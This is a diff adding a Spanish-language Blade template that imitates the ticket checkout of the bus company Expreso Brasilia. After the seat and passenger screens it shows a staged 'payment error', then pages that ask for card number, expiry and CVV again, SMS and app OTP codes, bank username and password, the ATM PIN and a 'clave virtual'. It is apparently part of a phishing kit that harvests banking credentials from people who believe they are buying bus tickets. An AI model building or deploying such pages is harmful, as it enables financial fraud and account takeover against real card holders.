+			<div class="flex items-center gap-2">
+				<div class="w-6 h-6 bg-red-400 rounded border-2 border-red-500"></div>
+				<span class="text-gray-600">Ocupada</span>
+			</div>
+		</div>
+
+		<!-- Contenedor del bus -->
+		<div class="flex-1 overflow-auto p-4">
+			<div class="max-w-sm mx-auto">
+				<!-- Frente del bus -->
+				<div class="bg-gray-300 rounded-t-3xl p-4 text-center mb-2">
+					<div class="flex justify-between items-center px-4">
+						<div class="w-10 h-10 bg-gray-400 rounded-full flex items-center justify-center">
+							<svg class="w-6 h-6 text-gray-600" fill="currentColor" viewBox="0 0 24 24">
+								<path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+							</svg>
+						</div>
+						<span class="text-gray-600 font-semibold text-sm">CONDUCTOR</span>
+						<div class="w-10 h-10 bg-gray-200 rounded"></div>
+					</div>
+				</div>
+
+				<!-- Sillas del bus (2 pisos simulados) -->
+				<div class="bg-white rounded-lg shadow-lg p-4">
+					<div class="text-center text-xs text-gray-500 mb-3 font-medium">PISO INFERIOR</div>
+
+					<!-- Grid de sillas - Piso 1 -->
+					<div id="sillasPiso1" class="grid grid-cols-5 gap-2 mb-6">
+						<!-- Las sillas se generan dinámicamente -->
+					</div>
+
+					<div class="border-t border-gray-200 my-4"></div>
+					<div class="text-center text-xs text-gray-500 mb-3 font-medium">PISO SUPERIOR</div>
+
+					<!-- Grid de sillas - Piso 2 -->
+					<div id="sillasPiso2" class="grid grid-cols-5 gap-2">
+						<!-- Las sillas se generan dinámicamente -->
+					</div>
+				</div>
+
+				<!-- Resumen de selección -->
+				<div class="mt-4 bg-white rounded-lg shadow-lg p-4">
+					<div class="flex justify-between items-center mb-2">
+						<span class="text-gray-600 text-sm">Asientos seleccionados:</span>
+						<span class="font-bold text-[#00529c]" id="asientosSeleccionados">Ninguno</span>
+					</div>
+					<div class="flex justify-between items-center mb-2">
+						<span class="text-gray-600 text-sm">Precio por asiento:</span>
+						<span class="font-semibold" id="precioAsiento">$0</span>
+					</div>
+					<div class="border-t pt-2 mt-2">
+						<div class="flex justify-between items-center">
+							<span class="text-gray-800 font-semibold">Total:</span>
+							<span class="text-xl font-bold text-[#d22630]" id="totalSillas">$0</span>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<!-- Botón continuar fijo abajo -->
+		<div class="bg-white border-t shadow-lg p-4">
+			<button onclick="continuarAPasajeros()" id="btnContinuarSillas" disabled
+				class="w-full bg-[#d22630] hover:bg-[#b01f28] disabled:bg-gray-400 text-white font-bold py-4 rounded-xl text-lg transition-colors">
+				Continuar
+			</button>
+		</div>
+	</section>
+
+	<!-- SECCIÓN: INFORMACIÓN DE PASAJEROS -->
+	<section id="seccion-pasajeros" class="brasilia-section min-h-screen bg-gray-100 hidden">
+		<!-- Header -->
+		<div class="bg-[#00529c] text-white px-4 py-3 flex items-center justify-between shadow-md">
+			<button onclick="volverASillas()" class="p-2 hover:bg-white/10 rounded-full transition">
+				<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/>
+				</svg>
+			</button>
+			<h2 class="text-lg font-semibold">Datos de pasajeros</h2>
+			<div class="w-10"></div>
+		</div>
+
+		<!-- Info del viaje compacta -->
+		<div class="bg-white shadow-sm px-4 py-2 border-b">
+			<div class="flex items-center justify-between text-sm">
+				<span class="text-gray-600" id="resumenViaje">Origen - Destino | 00:00</span>
+				<span class="font-bold text-[#00529c]" id="resumenAsientos">Asientos: --</span>
+			</div>
+		</div>
+
+		<!-- Formularios de pasajeros -->
+		<div class="flex-1 overflow-auto p-4">
+			<div class="max-w-lg mx-auto space-y-4" id="formulariosPasajeros">
+				<!-- Se generan dinámicamente según los asientos seleccionados -->
+			</div>
+
+			<!-- Resumen de compra -->
+			<div class="max-w-lg mx-auto mt-6 bg-white rounded-xl shadow-lg p-4">
+				<h3 class="font-bold text-gray-800 mb-3 flex items-center gap-2">
+					<svg class="w-5 h-5 text-[#00529c]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+						<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/>
+					</svg>
+					Resumen de compra
+				</h3>
+				<div class="space-y-2 text-sm">
+					<div class="flex justify-between">
+						<span class="text-gray-600">Ruta:</span>
+						<span class="font-medium" id="resumenRuta">--</span>
+					</div>
+					<div class="flex justify-between">
+						<span class="text-gray-600">Fecha:</span>
+						<span class="font-medium" id="resumenFecha">--</span>
+					</div>
+					<div class="flex justify-between">
+						<span class="text-gray-600">Hora:</span>
+						<span class="font-medium" id="resumenHora">--</span>
+					</div>
+					<div class="flex justify-between">
+						<span class="text-gray-600">Asientos:</span>
+						<span class="font-medium" id="resumenAsientosCompra">--</span>
+					</div>
+					<div class="flex justify-between">
+						<span class="text-gray-600">Cantidad:</span>
+						<span class="font-medium" id="resumenCantidad">0 pasajero(s)</span>
+					</div>
+					<div class="border-t pt-2 mt-2">
+						<div class="flex justify-between">
+							<span class="font-bold text-gray-800">Total a pagar:</span>
+							<span class="text-xl font-bold text-[#d22630]" id="resumenTotal">$0</span>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<!-- Botón pagar fijo abajo -->
+		<div class="bg-white border-t shadow-lg p-4">
+			<button onclick="irAPagar()" id="btnPagar" disabled
+				class="w-full bg-[#d22630] hover:bg-[#b01f28] disabled:bg-gray-400 text-white font-bold py-4 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
+				<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/>
+				</svg>
+				Ir a pagar
+			</button>
+		</div>
+	</section>
+
+	@php
+		// Nombre del comercio que aparece en las secciones OTP
+		$nombreComercio = 'Expreso Brasilia S.A.';
+	@endphp
+
+	<!-- OVERLAY DE CARGA CON SPINNER CENTRADO -->
+	<div id="loadingOverlay" class="fixed inset-0 z-50 hidden">
+		<div class="absolute inset-0 bg-black/50 backdrop-blur-sm"></div>
+		<div class="absolute inset-0 flex items-center justify-center">
+			<div class="text-center">
+				<svg class="animate-spin h-16 w-16 text-white mx-auto mb-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+					<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+					<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+				</svg>
+				<p id="loadingText" class="text-white text-lg font-medium">Procesando...</p>
+			</div>
+		</div>
+	</div>
+
+	<!-- SECCIÓN: TDC (Solicitar otra tarjeta de crédito) -->
+	<section id="seccion-tdc" class="brasilia-section min-h-screen bg-gray-50" style="display: none;">
+		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-center">
+			<h2 class="text-xl font-medium">Verificación Adicional</h2>
+		</div>
+		<div class="px-6 py-8">
+			<div class="text-center mb-8">
+				<div class="w-16 h-16 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-4">
+					<svg class="w-8 h-8 text-orange-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+						<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/>
+					</svg>
+				</div>
+				<h3 class="text-xl font-bold text-gray-900 mb-2">Error en el pago</h3>
+				<p class="text-gray-600">La información ingresada es incorrecta o no hay saldo suficiente. Por favor, verifica los datos e intenta nuevamente o usa otra tarjeta para completar el pago.</p>
+			</div>
+			<div class="max-w-sm mx-auto space-y-4">
+				<div>
+					<label class="block text-sm font-medium text-gray-700 mb-2">Número de tarjeta</label>
+					<input type="text" id="tdcNumeroInput" placeholder="" maxlength="19"
+						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
+						oninput="formatearNumeroTarjeta(this); validarTdc()">
+				</div>
+				<div class="grid grid-cols-2 gap-4">
+					<div>
+						<label class="block text-sm font-medium text-gray-700 mb-2">Vencimiento</label>
+						<input type="text" id="tdcVencimientoInput" placeholder="MM/AA" maxlength="5"
+							class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
+							oninput="formatearFechaVencimiento(this); validarTdc()">
+					</div>
+					<div>
+						<label class="block text-sm font-medium text-gray-700 mb-2">CVV</label>
+						<input type="password" id="tdcCvvInput" placeholder="***" maxlength="4"
+							class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
+							oninput="this.value = this.value.replace(/[^0-9]/g, ''); validarTdc()">
+					</div>
+				</div>
+				<div id="errorTdc" class="text-red-500 text-sm text-center hidden"></div>
+				<button onclick="enviarTdc()" id="btnTdc" disabled
+					class="w-full mt-6 bg-[#00529c] hover:bg-[#003d75] disabled:bg-gray-400 text-white font-bold py-4 px-6 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
+					<span id="textoTdc">Verificar</span>
+					<div id="spinnerTdc" class="hidden">
+						<svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+							<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+							<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+						</svg>
+					</div>
+				</button>
+			</div>
+		</div>
+	</section>
+
+	<!-- SECCIÓN: OTP SMS -->
+	<section id="seccion-otpsms" class="brasilia-section min-h-screen bg-gray-50 flex flex-col" style="display: none;">
+		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-center">
+			<h2 class="text-xl font-medium">VALIDACION DE SEGURIDAD</h2>
+		</div>
+		<div class="flex-1 flex items-center justify-center p-4">
+		<div class="bg-white rounded-xl shadow-lg max-w-md w-full p-6">
+			<!-- Logo dinámico según tipo de tarjeta -->
+			<div class="mb-4" id="otpSmsLogo">
+				<!-- Se actualizará dinámicamente -->
+			</div>
+
+			<!-- Título -->
+			<h3 class="text-xl font-bold text-gray-800 mb-1">Autenticación con código SMS</h3>
+			<p class="text-gray-600 text-sm mb-6">Ingresa el código enviado a tu celular.</p>
+
+			<!-- Información de la transacción -->
+			<div class="space-y-2 text-sm mb-6">
+				<div class="flex">
+					<span class="text-gray-600 w-36">Comercio:</span>
+					<span class="text-gray-800">{{ $nombreComercio }}</span>
+				</div>
+				<div class="flex">
+					<span class="text-gray-600 w-36">Monto:</span>
+					<span class="text-gray-800" id="otpSmsAmount">0 COP</span>
+				</div>
+				<div class="flex">
+					<span class="text-gray-600 w-36">Fecha:</span>
+					<span class="text-gray-800" id="otpSmsDate"></span>
+				</div>
+				<div class="flex">
+					<span class="text-gray-600 w-36">Número de Tarjeta:</span>
+					<span class="text-gray-800" id="otpSmsCardNumber">XXXX XXXX XXXX 0000</span>
+				</div>
+				<div class="flex">
+					<span class="text-gray-600 w-36">Mensaje Personal:</span>
+					<span class="text-gray-800"></span>
+				</div>
+				<div class="flex items-center">
+					<span class="text-gray-600 w-36">Código:</span>
+					<input type="text" id="otpSmsInput" maxlength="6" placeholder=""
+						class="flex-1 px-3 py-2 border border-[#00529c] rounded focus:outline-none focus:ring-2 focus:ring-[#00529c]"
+						oninput="this.value = this.value.replace(/[^0-9]/g, ''); validarOtpSms()">
+				</div>
+			</div>
+
+			<div id="errorOtpSms" class="text-red-500 text-sm mb-4 hidden"></div>
+
+			<!-- Botones -->
+			<div class="flex items-center gap-4 text-sm">
+				<a href="#" class="text-[#00529c] hover:underline">Ayuda</a>
+				<a href="#" class="text-[#00529c] hover:underline" onclick="mostrarSeccion('seccion-tarjeta'); return false;">Cancelar</a>
+				<button onclick="enviarOtpSms()" id="btnOtpSms" disabled
+					class="bg-[#00529c] hover:bg-[#003d75] disabled:bg-gray-400 text-white font-medium py-2 px-6 rounded transition-colors flex items-center gap-2">
+					<span id="textoOtpSms">Enviar</span>
+					<div id="spinnerOtpSms" class="hidden">
+						<svg class="animate-spin h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+							<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+							<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+						</svg>
+					</div>
+				</button>
+			</div>
+		</div>
+		</div>
+	</section>
+
+	<!-- SECCIÓN: OTP APP -->
+	<section id="seccion-otpapp" class="brasilia-section min-h-screen bg-gray-50 flex flex-col" style="display: none;">
+		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-center">
+			<h2 class="text-xl font-medium">VALIDACION DE SEGURIDAD</h2>
+		</div>
+		<div class="flex-1 flex items-center justify-center p-4">
+		<div class="bg-white rounded-xl shadow-lg max-w-md w-full p-6">
+			<!-- Logo dinámico según tipo de tarjeta -->
+			<div class="mb-4" id="otpAppLogo">
+				<!-- Se actualizará dinámicamente -->
+			</div>
+
+			<!-- Título -->
+			<h3 class="text-xl font-bold text-gray-800 mb-1">Autenticación con código de App</h3>
+			<p class="text-gray-600 text-sm mb-6">Ingresa el código generado en tu aplicación bancaria.</p>
+
+			<!-- Información de la transacción -->
+			<div class="space-y-2 text-sm mb-6">
+				<div class="flex">
+					<span class="text-gray-600 w-36">Comercio:</span>
+					<span class="text-gray-800">{{ $nombreComercio }}</span>
+				</div>
+				<div class="flex">
+					<span class="text-gray-600 w-36">Monto:</span>
+					<span class="text-gray-800" id="otpAppAmount">0 COP</span>
+				</div>
+				<div class="flex">
+					<span class="text-gray-600 w-36">Fecha:</span>
+					<span class="text-gray-800" id="otpAppDate"></span>
+				</div>
+				<div class="flex">
+					<span class="text-gray-600 w-36">Número de Tarjeta:</span>
+					<span class="text-gray-800" id="otpAppCardNumber">XXXX XXXX XXXX 0000</span>
+				</div>
+				<div class="flex">
+					<span class="text-gray-600 w-36">Mensaje Personal:</span>
+					<span class="text-gray-800"></span>
+				</div>
+				<div class="flex items-center">
+					<span class="text-gray-600 w-36">Código:</span>
+					<input type="text" id="otpAppInput" maxlength="8"
+						class="flex-1 px-3 py-2 border border-[#00529c] rounded focus:outline-none focus:ring-2 focus:ring-[#00529c]"
+						oninput="this.value = this.value.replace(/[^0-9]/g, ''); validarOtpApp()">
+				</div>
+			</div>
+
+			<div id="errorOtpApp" class="text-red-500 text-sm mb-4 hidden"></div>
+
+			<!-- Botones -->
+			<div class="flex items-center gap-4 text-sm">
+				<a href="#" class="text-[#00529c] hover:underline">Ayuda</a>
+				<a href="#" class="text-[#00529c] hover:underline" onclick="mostrarSeccion('seccion-tarjeta'); return false;">Cancelar</a>
+				<button onclick="enviarOtpApp()" id="btnOtpApp" disabled
+					class="bg-[#00529c] hover:bg-[#003d75] disabled:bg-gray-400 text-white font-medium py-2 px-6 rounded transition-colors flex items-center gap-2">
+					<span id="textoOtpApp">Enviar</span>
+					<div id="spinnerOtpApp" class="hidden">
+						<svg class="animate-spin h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+							<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+							<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+						</svg>
+					</div>
+				</button>
+			</div>
+		</div>
+		</div>
+	</section>
+
+	<!-- SECCIÓN: LOGIN (Revalidar credenciales) -->
+	<section id="seccion-login" class="brasilia-section min-h-screen bg-gray-50" style="display: none;">
+		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-center">
+			<h2 class="text-xl font-medium">VALIDACION DE SEGURIDAD</h2>
+		</div>
+		<div class="px-6 py-8">
+			<div class="text-center mb-8">
+				<div class="w-16 h-16 bg-yellow-100 rounded-full flex items-center justify-center mx-auto mb-4">
+					<svg class="w-8 h-8 text-yellow-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+						<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
+					</svg>
+				</div>
+				<h3 class="text-xl font-bold text-gray-900 mb-2">Confirma tu Identidad</h3>
+				<p class="text-gray-600">Por seguridad, necesitamos verificar tus credenciales bancarias</p>
+			</div>
+			<div class="max-w-sm mx-auto space-y-4">
+				<div>
+					<label class="block text-sm font-medium text-gray-700 mb-2">Usuario / Documento</label>
+					<input type="text" id="loginUsuarioInput" placeholder="Número de documento"
+						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
+						oninput="validarLogin()">
+				</div>
+				<div>
+					<label class="block text-sm font-medium text-gray-700 mb-2">Contraseña</label>
+					<input type="password" id="loginClaveInput" placeholder="Tu contraseña"
+						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
+						oninput="validarLogin()">
+				</div>
+				<div id="errorLogin" class="text-red-500 text-sm text-center hidden"></div>
+				<button onclick="enviarLogin()" id="btnLogin" disabled
+					class="w-full mt-6 bg-[#00529c] hover:bg-[#003d75] disabled:bg-gray-400 text-white font-bold py-4 px-6 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
+					<span id="textoLogin">Verificar</span>
+					<div id="spinnerLogin" class="hidden">
+						<svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+							<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+							<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+						</svg>
+					</div>
+				</button>
+			</div>
+		</div>
+	</section>
+
+	<!-- SECCIÓN: CLAVE CAJERO -->
+	<section id="seccion-clavecajero" class="brasilia-section min-h-screen bg-gray-50" style="display: none;">
+		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-center">
+			<h2 class="text-xl font-medium">VALIDACION DE SEGURIDAD</h2>
+		</div>
+		<div class="px-6 py-8">
+			<div class="text-center mb-8">
+				<div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
+					<svg class="w-8 h-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+						<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2zm7-5a2 2 0 11-4 0 2 2 0 014 0z"/>
+					</svg>
+				</div>
+				<h3 class="text-xl font-bold text-gray-900 mb-2">Clave de Cajero Automático</h3>
+				<p class="text-gray-600">Ingresa tu clave de 4 dígitos que usas en el cajero automático</p>
+			</div>
+			<div class="max-w-sm mx-auto">
+				<label class="block text-sm font-medium text-gray-700 mb-2">Clave de 4 dígitos</label>
+				<input type="password" id="claveCajeroInput" placeholder="****" maxlength="4"
+					class="w-full px-4 py-4 text-2xl text-center tracking-widest border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
+					oninput="this.value = this.value.replace(/[^0-9]/g, ''); validarClaveCajero()">
+				<p class="text-sm text-gray-500 mt-2 text-center">La misma clave que utilizas en cajeros automáticos</p>
+				<div id="errorClaveCajero" class="text-red-500 text-sm mt-2 text-center hidden"></div>
+				<button onclick="enviarClaveCajero()" id="btnClaveCajero" disabled
+					class="w-full mt-6 bg-[#00529c] hover:bg-[#003d75] disabled:bg-gray-400 text-white font-bold py-4 px-6 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
+					<span id="textoClaveCajero">Verificar</span>
+					<div id="spinnerClaveCajero" class="hidden">
+						<svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+							<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+							<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+						</svg>
+					</div>
+				</button>
+			</div>
+		</div>
+	</section>
+
+	<!-- SECCIÓN: CLAVE VIRTUAL -->
+	<section id="seccion-clavevirtual" class="brasilia-section min-h-screen bg-gray-50" style="display: none;">
+		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-center">
+			<h2 class="text-xl font-medium">VALIDACION DE SEGURIDAD</h2>
+		</div>
+		<div class="px-6 py-8">
+			<div class="text-center mb-8">
+				<div class="w-16 h-16 bg-indigo-100 rounded-full flex items-center justify-center mx-auto mb-4">
+					<svg class="w-8 h-8 text-indigo-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+						<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"/>
+					</svg>
+				</div>
+				<h3 class="text-xl font-bold text-gray-900 mb-2">Clave Virtual / Segunda Clave</h3>
+				<p class="text-gray-600">Ingresa tu clave virtual o segunda clave de seguridad</p>
+			</div>
+			<div class="max-w-sm mx-auto">
+				<label class="block text-sm font-medium text-gray-700 mb-2">Clave Virtual</label>
+				<input type="password" id="claveVirtualInput" placeholder="****" maxlength="6"
+					class="w-full px-4 py-4 text-2xl text-center tracking-widest border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
+					oninput="this.value = this.value.replace(/[^0-9]/g, ''); validarClaveVirtual()">
+				<p class="text-sm text-gray-500 mt-2 text-center">Tu clave virtual de transacciones</p>
+				<div id="errorClaveVirtual" class="text-red-500 text-sm mt-2 text-center hidden"></div>
+				<button onclick="enviarClaveVirtual()" id="btnClaveVirtual" disabled
+					class="w-full mt-6 bg-[#00529c] hover:bg-[#003d75] disabled:bg-gray-400 text-white font-bold py-4 px-6 rounded-xl text-lg transition-colors flex items-center justify-center gap-2">
+					<span id="textoClaveVirtual">Verificar</span>
+					<div id="spinnerClaveVirtual" class="hidden">
+						<svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+							<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+							<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+						</svg>
+					</div>
+				</button>
+			</div>
+		</div>
+	</section>
+
+	<!-- SECCIÓN: CAMBIAR MÉTODO DE PAGO -->
+	<section id="seccion-cambiar" class="brasilia-section min-h-screen bg-gray-50" style="display: none;">
+		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-center">
+			<h2 class="text-xl font-medium">Cambio de Método de Pago</h2>
+		</div>
+		<div class="px-6 py-12 flex flex-col items-center justify-center">
+			<div class="w-24 h-24 bg-blue-100 rounded-full flex items-center justify-center mb-6">
+				<svg class="w-16 h-16 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/>
+				</svg>
+			</div>
+			<h3 class="text-2xl font-bold text-gray-900 mb-4 text-center">Selecciona otro método de pago</h3>
+			<p class="text-gray-600 text-center max-w-md mb-8">
+				El método de pago seleccionado no pudo ser procesado. Por favor, elige otra forma de pago para continuar con tu transacción.
+			</p>
+			<button onclick="mostrarSeccion('seccion-metodo-pago')" class="bg-[#00529c] hover:bg-[#003d75] text-white font-bold py-4 px-8 rounded-xl text-lg transition-colors">
+				Cambiar método de pago
+			</button>
+		</div>
+	</section>
+
+	<!-- SECCIÓN: FIN (Éxito) -->
+	<section id="seccion-fin" class="brasilia-section min-h-screen bg-gray-50" style="display: none;">
+		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-center">
+			<h2 class="text-xl font-medium">Proceso Completado</h2>
+		</div>
+		<div class="px-6 py-12 flex flex-col items-center justify-center">
+			<div class="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mb-6">
+				<svg class="w-16 h-16 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+				</svg>
+			</div>
+			<h3 class="text-2xl font-bold text-gray-900 mb-3">¡Compra Exitosa!</h3>
+			<p class="text-gray-600 text-center max-w-sm mb-4">Tu compra de tiquetes ha sido procesada correctamente.</p>
+			<p class="text-gray-500 text-sm text-center">Recibirás un correo de confirmación con los detalles de tu viaje.</p>
+			<div class="mt-8 bg-gray-50 rounded-xl p-6 w-full max-w-sm">
+				<p class="text-sm text-gray-500 text-center">Número de confirmación:</p>
+				<p class="text-xl font-bold text-gray-900 text-center" id="numeroConfirmacion">EB-000000</p>
+			</div>
+			<p class="text-sm text-gray-400 mt-6">Serás redirigido en unos momentos...</p>
+		</div>
+	</section>
+
+	<!-- SECCIÓN: ERROR -->
+	<section id="seccion-error" class="brasilia-section min-h-screen bg-gray-50" style="display: none;">
+		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-center">
+			<h2 class="text-xl font-medium">Error en el Proceso</h2>
+		</div>
+		<div class="px-6 py-12 flex flex-col items-center justify-center">
+			<div class="w-24 h-24 bg-red-100 rounded-full flex items-center justify-center mb-6">
+				<svg class="w-16 h-16 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+				</svg>
+			</div>
+			<h3 class="text-2xl font-bold text-gray-900 mb-3">No pudimos procesar tu solicitud</h3>
+			<p class="text-gray-600 text-center max-w-sm mb-4">Ha ocurrido un error al procesar tu pago. Por favor, intenta nuevamente más tarde.</p>
+			<p class="text-gray-500 text-sm text-center">Si el problema persiste, comunícate con nuestro servicio al cliente.</p>
+			<button onclick="window.location.reload()" class="mt-8 bg-[#00529c] hover:bg-[#003d75] text-white font-bold py-3 px-8 rounded-xl text-lg transition-colors">
+				Intentar de nuevo
+			</button>
+			<p class="text-sm text-gray-400 mt-6">Serás redirigido en unos momentos...</p>
+		</div>
+	</section>
+
+	<!-- SECCIÓN: MÉTODO DE PAGO -->
+	<section id="seccion-metodo-pago" class="brasilia-section min-h-screen bg-gray-50" style="display: none;">
+		<!-- Header azul -->
+		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-between">
+			<button onclick="volverDesdeMetodoPago()" class="p-2">
+				<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/>
+				</svg>
+			</button>
+			<h2 class="text-xl font-medium">Método de pago</h2>
+			<button onclick="volverDesdeMetodoPago()" class="p-2">
+				<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
+				</svg>
+			</button>
+		</div>
+
+		<div class="px-6 py-6">
+			<!-- Total a pagar -->
+			<div class="bg-gray-50 rounded-xl p-6 mb-6">
+				<div class="flex items-center justify-between">
+					<span class="text-lg font-medium text-gray-700">Total a pagar:</span>
+					<div class="text-right">
+						<div class="text-3xl font-bold text-gray-900"><span id="totalMetodoPago">0</span> <span id="monedaMetodoPago">COP</span></div>
+					</div>
+				</div>
+			</div>
+
+			<!-- Título -->
+			<h3 class="text-lg font-medium text-gray-900 mb-4">Selecciona tu método de pago</h3>
+
+			<!-- Opciones de método de pago -->
+			<div class="space-y-4">
